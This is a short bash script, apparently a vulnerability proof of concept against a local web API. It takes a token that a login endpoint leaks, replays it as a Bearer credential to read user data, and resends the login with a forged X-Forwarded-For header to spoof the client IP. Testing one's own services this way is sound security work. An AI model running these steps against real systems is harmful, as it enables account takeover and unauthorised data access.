#!/bin/bash
set +e
TOK=$(curl -sS http://127.0.0.1:8800/api/login | python -c "import sys,json;print(json.load(sys.stdin)['token'])")
echo "=== 泄露的 TOKEN: $TOK ==="
echo
echo "=== [6] 用泄露 token 访问 /api/user ==="
curl -sS -i -X GET http://127.0.0.1:8800/api/user -H "Authorization: Bearer $TOK"
echo
echo "=== [7] 重放 /api/login (任意伪造 IP) ==="
curl -sS -i -X GET http://127.0.0.1:8800/api/login -H "X-Forwarded-For: 8.8.8.8"